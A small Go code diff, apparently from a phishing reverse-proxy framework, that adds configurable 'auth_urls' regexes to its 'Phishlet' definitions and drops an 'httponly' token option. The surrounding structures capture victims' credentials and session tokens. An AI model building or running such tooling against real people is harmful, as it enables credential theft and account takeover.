@@ -42,6 +42,7 @@ type Phishlet struct {
 	domains      []string
 	subfilters   map[string][]SubFilter
 	authTokens   map[string][]*AuthToken
+	authUrls     []*regexp.Regexp
 	k_username   string
 	re_username  string
 	k_password   string
@@ -88,6 +89,7 @@ type ConfigPhishlet struct {
 	ProxyHosts  []ConfigProxyHost `mapstructure:"proxy_hosts"`
 	SubFilters  []ConfigSubFilter `mapstructure:"sub_filters"`
 	AuthTokens  []ConfigAuthToken `mapstructure:"auth_tokens"`
+	AuthUrls    []string          `mapstructure:"auth_urls"`
 	UserRegex   ConfigUserRegex   `mapstructure:"user_regex"`
 	PassRegex   ConfigPassRegex   `mapstructure:"pass_regex"`
 	LandingPath []string          `mapstructure:"landing_path"`
@@ -114,6 +116,7 @@ func (p *Phishlet) Clear() {
 	p.domains = []string{}
 	p.subfilters = make(map[string][]SubFilter)
 	p.authTokens = make(map[string][]*AuthToken)
+	p.authUrls = []*regexp.Regexp{}
 	p.k_username = ""
 	p.re_username = ""
 	p.k_password = ""
@@ -155,6 +158,13 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		if err != nil {
 			return err
 		}
+	}
+	for _, au := range fp.AuthUrls {
+		re, err := regexp.Compile(au)
+		if err != nil {
+			return err
+		}
+		p.authUrls = append(p.authUrls, re)
 	}
 	p.re_username = fp.UserRegex.Re
 	p.k_username = fp.UserRegex.Key
@@ -265,8 +275,6 @@ func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
 					if err != nil {
 						return err
 					}
-				case "httponly":
-					at.http_only = true
 				}
 			}
 			p.authTokens[hostname] = append(p.authTokens[hostname], at)
